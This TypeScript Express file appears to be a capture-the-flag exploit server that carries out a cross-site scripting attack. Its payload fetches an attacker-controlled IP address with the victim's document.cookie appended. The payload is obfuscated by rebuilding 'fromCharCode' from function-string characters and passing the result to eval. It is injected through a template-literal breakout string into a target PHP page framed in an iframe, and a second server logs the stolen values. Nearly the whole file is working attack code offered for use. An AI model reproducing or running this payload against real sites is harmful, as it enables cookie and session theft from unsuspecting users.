import express from "express";
import * as fs from "fs-extra";
import * as https from "https";
import * as path from "path";


let makeDumbLetter = (l: string) => {
    return `((function ${l}() {}) + [])[9]`;
}

let render = (js: string) => {
    let fnName = "fromCharCode".split("").map((c) => makeDumbLetter(c)).join(" + ");
    return `eval(String[${fnName}](${js.split("").map((c) => c.charCodeAt(0)).join(",")}))`;
}

const payload = `
(fetch("http://134.209.220.198:7070/flag?c=" + document.cookie));
`

let main = async () => {
    const secureApp = express();

    // 2261900486:8080
    secureApp.get("/", (req, res) => {
        res.redirect(`http://134.209.220.198:7070/test?inj=${encodeURIComponent(payload)}`);
    })

    https.createServer({
        key: await fs.readFile(path.join(__dirname, "cert/server.key")),
        cert: await fs.readFile(path.join(__dirname, "cert/server.cert")),
    }, secureApp).listen(8080, "0.0.0.0");


    const insecureApp = express();
    insecureApp.use("/", (req, res, next) => {
        console.log(`Got response: ${req.path}, ${JSON.stringify(req.query)}, ${JSON.stringify(req.body)}`);
        next();
    });

    insecureApp.get("/test", (req, res) => {
        let injection = req.query.inj;
        let result = render(injection);
        let ourCode = '`}`}; {injectionPoint}; {(" `}; class ${x = `${`'.replace("{injectionPoint}", result);
        let url = `http://3.114.5.202/fd.php?q=${encodeURIComponent(ourCode)}`;
        res.send(`<iframe src="${url}"/>`);
    })

    insecureApp.listen(7070);
}

main();